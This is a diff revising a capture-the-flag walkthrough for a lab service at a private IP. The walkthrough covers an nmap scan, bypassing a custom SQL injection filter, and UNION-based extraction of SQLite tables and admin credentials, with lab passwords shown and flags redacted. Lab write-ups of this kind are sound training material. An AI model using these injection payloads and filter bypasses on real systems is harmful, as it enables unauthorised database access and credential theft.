@@ -10,13 +10,14 @@ Target: ``10.10.22.91``
 
 We connect with
 ``nc 10.10.22.91 1337``
-and enter username smokey gives us 
+and enter username smokey which gives us 
 
 ```
 Please enter your username: smokey
 Password: vYQ5ngPpw8AdUmL
 ```
-Only SSH and the custom 1337 service
+
+Only SSH and the custom 1337 service when we nmap
 ```
 sudo nmap -p- 10.10.73.73
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-09 05:19 EDT
@@ -31,9 +32,9 @@ Nmap done: 1 IP address (1 host up) scanned in 422.69 seconds
 ```
 
 # Findings
-- We try some obious admin credentails, no luck.
-- We try the username and password with SSH, no luck.
-- We hit it with a large username list, we get users like alice although no admin. included the script below.
+- We try some obvious admin credentails, no luck
+- We try the username and password with SSH, no luck
+- We hit it with a large username list, we get users like alice although no admin. included the script at the end of this walk through for those intrested
 - We hit with some SQLi and find there is some custom filtering, the most likely entry
 
 ```
@@ -42,7 +43,7 @@ For strange reasons I can't explain, any input containing /*, -- or, %0b is not 
 ```
 # Exploiting Findings
 
-Find some weakness in the filtering we remove -- to find it by-passes filter but we get an error, 
+We find some weakness in the filtering we remove -- to find it by-passes filter but we get an syntax error, 
 ```
 Please enter your username: ' or 1=1 
 Error: unrecognized token: "' LIMIT 30"
@@ -50,7 +51,7 @@ Error: unrecognized token: "' LIMIT 30"
 Please enter your username: ' or '1'='1' 
 Error: unrecognized token: "'1'' LIMIT 30"
 ```
-Ahh get around the sytax error with
+In the error we see two '' where we have injected the SQL, so to get around the sytax error we remove ' from the end of our injection,
 ```
 Please enter your username: ' or '1'='1  
 Password: tF8tj2o94WE4LKC
@@ -75,33 +76,33 @@ Username not found.
 Please enter your username:      
 ```
 
-back to find SQL type
+Back to find SQL type
 
-MySQL
+### MySQL
 ```
 Please enter your username: ' Union Select @@version'                                                                                                                                                                                                                  
 Error: unrecognized token: "@"  
 ```
 
-PostgreSQL
+### PostgreSQL
 ```
 Please enter your username: ' Union Select version()'                                                                                                                                                                                                                  
 Error: no such function: version      
 ```
 
-SQLite - Bingo we get a hit
+### SQLite - Bingo we get a hit
 ```
 Please enter your username: ' Union Select sqlite_version()'                                                                                                                                              
 Password: 3.31.1  
 ```
 
-Find the table name
+### Find the table name
 ```
 Please enter your username: ' UnIoN SeLeCt name FROM sqlite_master WHERE type='table
 Password: admintable
 ```
 
-Find the columns name
+### Find the columns name
 ```
 Please enter your username: ' UnIoN SeLeCt sql FROM sqlite_master WHERE name='admintable
 Password: CREATE TABLE admintable (
@@ -110,25 +111,25 @@ Password: CREATE TABLE admintable (
                    password INTEGER)
 ```
 
-What is the admin username?
+### What is the admin username?
 ```
 Please enter your username: ' UnIoN SeLeCt username FROM admintable'
 Password: ##########
 ```
-What is the password to the username mentioned in question 1?
+### What is the password to the username mentioned in question 1?
 ```
 Please enter your username: ' UnIoN SeLeCt password FROM admintable where username = '##########
 Password: ##########
 ```
 
-What is the flag?
+### What is the flag?
 ```
 Please enter your username: ' UnIoN SeLeCt password FROM admintable'
 Password: ##########
 ```
-# Summary 
-Nice room to show why custom frameworks for preventing SQLi is a bad idea, took me a bit to long to start with SQLi and was focused on Bruteforcing. Including bruteforcing script below as while it didn't work it's a good showcase for pwntools 
 
+# Summary 
+Nice room to show why custom built frameworks for preventing SQLi is a bad idea and to use [prepared statements](https://www.sqlite.org/c3ref/stmt.html). Also a good room for showcasing locating SQL version and extracting tables and column data. It took me a bit to long to start with SQLi and was focused on bruteforcing, although I do enjoy a pwntools script so was a bit of a side challenge. Including bruteforcing script below as while it didn't work it's a good showcase for pwntools so included in the walkthrough even though it was a failed path.  
 
 # failed exploration 
 
@@ -190,13 +191,4 @@ print("[*] Username enumeration completed.")
 ```
 
 ``python3 lightbrute.py``
-
-
-
-
-
-
-
-
-
 
